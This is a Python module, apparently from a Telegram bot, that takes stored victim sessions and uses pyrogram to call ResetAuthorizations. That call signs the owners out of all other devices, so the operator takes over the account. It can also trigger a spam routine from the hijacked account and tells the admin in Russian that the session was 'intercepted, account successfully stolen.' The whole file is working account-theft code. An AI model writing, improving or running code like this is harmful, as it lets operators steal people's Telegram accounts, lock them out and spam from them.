import asyncio
from pyrogram import Client
from pyrogram.raw.functions.auth import ResetAuthorizations
from tgbot.services.Session import ImportSession


async def update_sessions(bot):
	config = bot.config
	data = bot.config.data
	admin = bot.config.admin
	while True:
		await asyncio.sleep(config.check_valid_session)
		try:

			users = []
			for id in data.storage.keys():
				i = data.storage[id]
				if i['session'] and not i['reset_auth']:
					if not i['phone'] in data._sign_in.keys():
						users.append(i)

			for user in users:
				client = ImportSession().inject(user['phone'])
				app = client.client
				async with app as client:
					try:
						if not await client.get_me():
							await data.delete_select_session(user['user_id'])
							if config.invalid_session:
								await bot.send_message(admin, f'❌ Пользователь <code>{user["user_id"]}</> удалил сессию.')
							continue 
					except Exception as e:
						await data.delete_select_session(user['user_id'])
						if config.log.invalid_session:
							await bot.send_message(admin, f'❌ Пользователь <code>{user["user_id"]}</> удалил сессию.')
						continue 

					try:
						await client.invoke(ResetAuthorizations())
						await data.reset_auth(user['user_id'])
						if config.spam_in_reset_auth:
							await ImportSession(client).spam_reset_auth()
						if config.log.reset_auth:
							await bot.send_message(admin, f'✅ <b>Сессия пользователя <code>{user["user_id"]}</> перехвачена, аккаунт успешно украден.</>')
					except:
						pass

		except Exception as e:
			print('session error:', e)
			